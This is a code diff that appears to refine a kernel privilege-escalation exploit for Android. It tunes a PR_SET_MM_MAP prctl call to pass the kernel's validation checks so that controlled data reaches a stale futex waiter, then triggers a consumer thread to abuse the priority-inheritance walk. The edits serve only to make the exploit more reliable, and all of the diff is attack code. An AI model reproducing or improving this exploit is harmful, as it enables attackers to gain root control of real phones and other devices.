@@ -772,15 +772,23 @@ void do_prctl_mm_map_route(void) {
     uint64_t auxv;
     uint32_t auxv_size, exe_fd;
   } map;
-  /* validate_prctl_map_addr wants every field in [mmap_min_addr, TASK_SIZE)
-   * and the pairs ordered. mmap_min_addr is 0x10000 on Android, so a base
-   * there, with start_code=end_code and arg_start=arg_end, passes both the
-   * range and the order checks. RLIMIT_DATA is unlimited so the data-limit
-   * check passes. */
-  const uint64_t base = 0x10000;
+  /* the kernel rejects the call with -EINVAL before the copy when data_size
+   * does not match sizeof(struct prctl_mm_map), so pin the layout here */
+  _Static_assert(sizeof(map) == 0x68, "prctl_mm_map layout drift");
+  /* validate_prctl_map_addr wants every field in [mmap_min_addr, TASK_SIZE),
+   * start_code strictly below end_code, and the other pairs ordered. Read the
+   * real mmap_min_addr so a device that ships a higher one still passes.
+   * check_data_rlimit passes because RLIMIT_DATA is unlimited. */
+  uint64_t base = 0x10000;
+  char minbuf[32] = {0};
+  read_first_line("/proc/sys/vm/mmap_min_addr", minbuf, sizeof(minbuf));
+  if (minbuf[0]) {
+    unsigned long v = strtoul(minbuf, NULL, 10);
+    if (v > base) base = v;
+  }
   memset(&map, 0, sizeof(map));
   map.start_code = base;
-  map.end_code = base;
+  map.end_code = base + 1; /* strict '<', equal fails the check */
   map.start_data = base;
   map.end_data = base;
   map.start_brk = base;
@@ -799,6 +807,11 @@ void do_prctl_mm_map_route(void) {
   errno = 0;
   int ret = prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0);
   route_last_step = 72; route_last_errno = errno;
+  pr_info("prctl route ret=%d errno=%d base=%#llx\n", ret, errno,
+          (unsigned long long)base);
+  /* a refused prctl copied nothing, so the stale waiter still points at its
+   * old lock; arming the consumer there only faults the PI walk */
+  if (ret != 0) return;
   atomic_store(&punch_consume_go, 1);
   for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0;
        spin++)
@@ -806,7 +819,8 @@ void do_prctl_mm_map_route(void) {
   atomic_store(&punch_consume_go, 0);
   while (atomic_load(&consumer_inflight))
     __asm__ volatile("yield" ::: "memory");
-  if (ret == 0 || atomic_load(&consumer_success) > 0) {
-    route_last_step = 0; route_last_errno = 0;
+  if (atomic_load(&consumer_success) > 0) {
+    route_last_step = 0;
+    route_last_errno = 0;
   }
 }
